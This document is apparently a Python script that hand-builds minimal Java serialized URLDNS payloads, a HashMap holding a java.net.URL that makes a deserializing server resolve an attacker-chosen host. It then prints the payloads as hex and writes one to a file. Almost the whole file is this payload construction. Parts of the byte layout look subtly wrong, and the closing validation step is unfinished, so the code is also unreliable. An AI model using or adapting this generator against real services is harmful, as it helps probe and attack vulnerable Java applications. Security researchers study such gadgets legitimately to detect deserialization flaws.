#!/usr/bin/env python3
"""
创建最小化的 URLDNS payload
"""
import struct

def create_minimal_urldns(host):
    """
    创建最小的 URLDNS payload
    核心思想: 只创建 HashMap + URL, 最小化字段和数据
    """
    
    # 最小的 payload 结构:
    # - HashMap with 1 entry
    # - URL object as key
    # - null as value (hashCode check on key triggers DNS)
    
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed'  # STREAM_MAGIC
    payload += b'\x00\x05'  # STREAM_VERSION
    
    # TC_OBJECT (0x73) + TC_CLASSDESC (0x72) for HashMap
    payload += b'\x73\x72'
    
    # 类名: java.util.HashMap
    payload += struct.pack('>H', 17)  # 类名长度
    payload += b'java.util.HashMap'
    
    # serialVersionUID
    payload += struct.pack('>q', 362498820763181265)
    
    # classDescFlags: SC_SERIALIZABLE | SC_WRITE_METHOD
    payload += b'\x03'
    
    # field count: 2
    payload += struct.pack('>H', 2)
    
    # Field 1: float loadFactor
    payload += b'F'  # typecode
    payload += struct.pack('>H', 10) + b'loadFactor'
    
    # Field 2: int threshold  
    payload += b'I'  # typecode
    payload += struct.pack('>H', 9) + b'threshold'
    
    # TC_ENDBLOCKDATA + TC_NULL (no superclass)
    payload += b'\x78\x70'
    
    # Object data for HashMap
    payload += struct.pack('>f', 0.75)  # loadFactor = 0.75
    payload += struct.pack('>i', 0)     # threshold = 0
    
    # writeObject data for HashMap
    payload += struct.pack('>i', 16)    # capacity
    payload += struct.pack('>i', 1)     # size (1 entry)
    
    # Key: URL object
    payload += b'\x73\x72'  # TC_OBJECT + TC_CLASSDESC
    
    # 类名: java.net.URL  
    payload += struct.pack('>H', 12)
    payload += b'java.net.URL'
    
    # serialVersionUID
    payload += struct.pack('>q', -7627629684871044846)
    
    # flags
    payload += b'\x03'
    
    # field count: 7
    payload += struct.pack('>H', 7)
    
    # Field 1: int hashCode
    payload += b'I'
    payload += struct.pack('>H', 8) + b'hashCode'
    
    # Field 2: int port
    payload += b'I'
    payload += struct.pack('>H', 4) + b'port'
    
    # Field 3: L authority
    payload += b'L'
    payload += struct.pack('>H', 9) + b'authority'
    payload += b'\x74'  # TC_STRING
    payload += struct.pack('>H', 18) + b'Ljava/lang/String;'
    
    # Field 4: L file
    payload += b'L'
    payload += struct.pack('>H', 4) + b'file'
    payload += b'\x71'  # TC_REFERENCE - 引用之前的String类型描述
    payload += struct.pack('>i', 0x7e0001)
    
    # Field 5: L host
    payload += b'L'
    payload += struct.pack('>H', 4) + b'host'
    payload += b'\x71'
    payload += struct.pack('>i', 0x7e0001)
    
    # Field 6: L protocol
    payload += b'L'
    payload += struct.pack('>H', 8) + b'protocol'
    payload += b'\x71'
    payload += struct.pack('>i', 0x7e0001)
    
    # Field 7: L ref  
    payload += b'L'
    payload += struct.pack('>H', 3) + b'ref'
    payload += b'\x71'
    payload += struct.pack('>i', 0x7e0001)
    
    # TC_ENDBLOCKDATA + TC_NULL
    payload += b'\x78\x70'
    
    # URL object data
    payload += struct.pack('>i', -1)  # hashCode = -1 (triggers recalc)
    payload += struct.pack('>i', -1)  # port = -1
    
    # authority (host string)
    payload += b'\x74'  # TC_STRING
    payload += struct.pack('>H', len(host))
    payload += host.encode()
    
    # file
    payload += b'\x74'
    payload += struct.pack('>H', 1) + b'/'
    
    # host (reference to authority)
    payload += b'\x71'
    payload += struct.pack('>i', 0x7e0004)
    
    # protocol
    payload += b'\x74'
    payload += struct.pack('>H', 4) + b'http'
    
    # ref (null)
    payload += b'\x70'
    
    # Value: null (for HashMap entry)
    payload += b'\x78'  # TC_ENDBLOCKDATA for URL
    
    # TC_REFERENCE back to URL as value doesn't matter, use null
    payload += b'\x70'  # TC_NULL
    
    # TC_ENDBLOCKDATA for HashMap
    payload += b'\x78'
    
    return bytes(payload)


def create_super_minimal_urldns(host):
    """
    尝试创建更短的版本 - 使用更短的 host
    """
    payload = bytearray()
    
    # Stream header: AC ED 00 05
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT for HashMap: 73 72 
    payload += b'\x73\x72'
    
    # 类名 java.util.HashMap (17 bytes)
    payload += b'\x00\x11java.util.HashMap'
    
    # serialVersionUID (8 bytes)
    payload += b'\x05\x07\xda\xc1\xc3\x16\x60\xd1'
    
    # flags + field count
    payload += b'\x03\x00\x02'
    
    # Fields: F loadFactor, I threshold
    payload += b'F\x00\x0aloadFactor'
    payload += b'I\x00\x09threshold'
    
    # TC_ENDBLOCKDATA + TC_NULL
    payload += b'\x78\x70'
    
    # Object data: loadFactor=0.75, threshold=0, capacity=16, size=1
    payload += b'\x3f\x40\x00\x00'  # 0.75f
    payload += b'\x00\x00\x00\x00'  # 0
    payload += b'\x00\x00\x00\x10'  # 16
    payload += b'\x00\x00\x00\x01'  # 1
    
    # URL object
    payload += b'\x73\x72'
    payload += b'\x00\x0cjava.net.URL'
    payload += b'\x96\x25\x37\x36\x1a\xfc\xe4\x72'  # serialVersionUID
    payload += b'\x03\x00\x07'  # flags + 7 fields
    
    # hashCode, port
    payload += b'I\x00\x08hashCode'
    payload += b'I\x00\x04port'
    
    # String fields with type reference trick
    payload += b'L\x00\x09authority\x74\x00\x12Ljava/lang/String;'
    payload += b'L\x00\x04file\x71\x00~\x00\x01'
    payload += b'L\x00\x04host\x71\x00~\x00\x01'
    payload += b'L\x00\x08protocol\x71\x00~\x00\x01'
    payload += b'L\x00\x03ref\x71\x00~\x00\x01'
    
    payload += b'\x78\x70'
    
    # hashCode=-1, port=-1
    payload += b'\xff\xff\xff\xff'
    payload += b'\xff\xff\xff\xff'
    
    # authority/host
    host_bytes = host.encode()
    payload += b'\x74'
    payload += struct.pack('>H', len(host_bytes))
    payload += host_bytes
    
    # file: "/"
    payload += b'\x74\x00\x01/'
    
    # host: reference to authority
    payload += b'\x71\x00~\x00\x04'
    
    # protocol: "http"
    payload += b'\x74\x00\x04http'
    
    # ref: null
    payload += b'\x70'
    
    # end URL, value=null, end HashMap
    payload += b'\x78\x70\x78'
    
    return bytes(payload)


if __name__ == "__main__":
    test_host = "a.cn"  # 最短的域名
    
    p1 = create_minimal_urldns(test_host)
    print(f"Minimal URLDNS payload size: {len(p1)} bytes")
    print(f"Hex: {p1.hex()}")
    print()
    
    p2 = create_super_minimal_urldns(test_host)
    print(f"Super minimal URLDNS payload size: {len(p2)} bytes")
    print(f"Hex: {p2.hex()}")
    
    # 验证
    print("\nValidating super minimal payload...")
    import subprocess
    with open("test_payload.bin", "wb") as f:
        f.write(p2)
    
    # 如果有 Java 环境可以验证
